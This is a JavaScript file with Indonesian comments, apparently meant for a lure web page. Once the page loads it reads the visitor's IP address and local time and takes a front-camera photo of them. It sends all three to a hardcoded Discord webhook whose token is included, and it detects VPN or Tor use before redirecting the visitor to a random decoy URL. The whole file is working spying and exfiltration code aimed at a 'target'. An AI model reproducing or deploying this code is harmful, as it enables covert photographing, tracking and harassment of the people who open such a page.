const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9"; 
const jsonURL = "server.json"; // Untuk redirect normal
const vpnJsonURL = "vpn.json"; // Untuk redirect jika pakai VPN

const canvas = document.createElement("canvas");
const context = canvas.getContext("2d");
canvas.style.display = "none";
document.body.appendChild(canvas);

// Fungsi mendapatkan waktu lokal HP target
function getLocalTime() {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, "0");
    const minutes = now.getMinutes().toString().padStart(2, "0");
    const seconds = now.getSeconds().toString().padStart(2, "0");
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return `${hours}:${minutes}:${seconds} (${timeZone})`;
}

// Ambil IP Target
fetch("https://api64.ipify.org?format=json")
    .then(response => response.json())
    .then(data => {
        const ip = data.ip;
        const location = "Unknown"; // Bisa diganti dengan API lokasi jika perlu

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                
                setTimeout(() => {
                    const localTime = getLocalTime();
                    imageCapture.takePhoto()
                        .then(blob => {
                            sendToDiscord(blob, ip, location, localTime);
                            track.stop();
                        })
                        .catch(error => console.error("Gagal ambil foto:", error));
                }, 3000);
            })
            .catch(err => console.error("Akses kamera ditolak:", err));

        // Cek apakah pengguna pakai VPN atau tidak
        checkVPN(ip);
    })
    .catch(err => console.error("Gagal ambil IP:", err));

// Kirim ke Webhook Discord
function sendToDiscord(blob, ip, location, localTime) {
    const formData = new FormData();
    formData.append("file", blob, "capture.jpg");

    formData.append("payload_json", JSON.stringify({
        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Location**: ${location}\n⏰ **InterTime**: ${localTime}`
    }));

    fetch(webhookURL, {
        method: "POST",
        body: formData
    });
}

// Cek VPN dan pilih JSON yang sesuai
function checkVPN(ip) {
    fetch(`https://ipapi.co/${ip}/json/`) // Bisa ganti dengan API lain
        .then(response => response.json())
        .then(data => {
            if (data.security?.vpn || data.proxy || data.tor) {
                redirectWithJson(vpnJsonURL); // Jika pakai VPN, ambil URL dari vpn.json
            } else {
                redirectWithJson(jsonURL); // Jika tidak, ambil URL dari server.json
            }
        })
        .catch(error => {
            console.error("Gagal mendeteksi VPN:", error);
            redirectWithJson(jsonURL); // Jika gagal deteksi, tetap redirect ke server.json
        });
}

// Ambil URL acak dari JSON dan redirect
function redirectWithJson(jsonFile) {
    fetch(jsonFile)
        .then(response => response.json())
        .then(data => {
            const urls = data.urls;
            if (urls && urls.length > 0) {
                const randomURL = urls[Math.floor(Math.random() * urls.length)];
                setTimeout(() => {
                    window.location.href = randomURL;
                }, 11000);
            } else {
                console.error("JSON tidak berisi URL");
            }
        })
        .catch(error => console.error(`Gagal mengambil URL dari ${jsonFile}:`, error));
}
